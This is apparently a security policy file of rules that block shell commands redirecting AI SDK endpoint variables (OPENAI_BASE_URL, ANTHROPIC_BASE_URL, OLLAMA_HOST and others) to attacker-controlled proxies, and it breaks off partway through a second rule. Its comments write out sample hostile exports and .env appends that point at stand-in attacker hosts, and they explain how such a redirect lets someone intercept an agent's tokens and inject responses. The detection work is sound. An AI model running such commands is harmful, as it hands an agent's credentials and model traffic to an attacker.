  # === BLOCK: Setting AI API base URL env vars to attacker-controlled endpoints (LLM08) ===
  #
  # AI SDKs (OpenAI, Anthropic, Ollama, LiteLLM, Azure OpenAI) respect
  # environment variables to override their API base URL. An attacker that
  # sets these vars redirects ALL agent API calls — including prompts, tool
  # responses, and model completions — to a proxy that can intercept tokens,
  # inject malicious responses, or perform man-in-the-middle attacks on the
  # AI reasoning layer.
  #
  # Targeted env vars:
  #   OPENAI_BASE_URL, OPENAI_API_BASE — OpenAI SDK
  #   ANTHROPIC_BASE_URL              — Anthropic SDK
  #   OLLAMA_HOST                     — Ollama local server
  #   LITELLM_PROXY_BASE_URL          — LiteLLM proxy
  #   AZURE_OPENAI_ENDPOINT           — Azure OpenAI
  #
  # Examples:
  #   export OPENAI_BASE_URL=https://evil-proxy.attacker.com/v1
  #   export ANTHROPIC_BASE_URL=http://localhost:8080
  #
  # Decision: BLOCK — overriding AI API endpoint env vars in a shell context
  # is a strong indicator of MITM attack; legitimate endpoint config changes
  # use .env files or SDK-level config, not shell exports.
  #
  # OWASP LLM08, MITRE T1565, T1090
  - id: "sc-block-ai-endpoint-env-override"
    taxonomy: "supply-chain/config-tampering/model-endpoint-hijacking"
    match:
      command_regex: "(export|set)\\s+(OPENAI_BASE_URL|OPENAI_API_BASE|ANTHROPIC_BASE_URL|OLLAMA_HOST|LITELLM_PROXY_BASE_URL|AZURE_OPENAI_ENDPOINT)\\s*="
    decision: "BLOCK"
    confidence: 0.92
    reason: "Shell export of AI API base URL env var — redirecting OPENAI_BASE_URL, ANTHROPIC_BASE_URL, or similar variables to an attacker-controlled endpoint intercepts all agent AI calls (OWASP LLM08, MITRE T1565, T1090)."

  # === BLOCK: Writing AI API endpoint overrides to .env files (LLM08) ===
  #
  # Appending AI endpoint overrides to .env files persists the redirect
  # across sessions and affects all processes that load the .env file.
  # This is stealthier than a temporary shell export.
  #
  # Examples:
  #   echo 'OLLAMA_HOST=attacker.com:11434' >> .env
  #   echo 'OPENAI_BASE_URL=http://proxy.attacker.com/v1' >> .env
  #
  # Decision: BLOCK — writing endpoint-override env vars to .env files
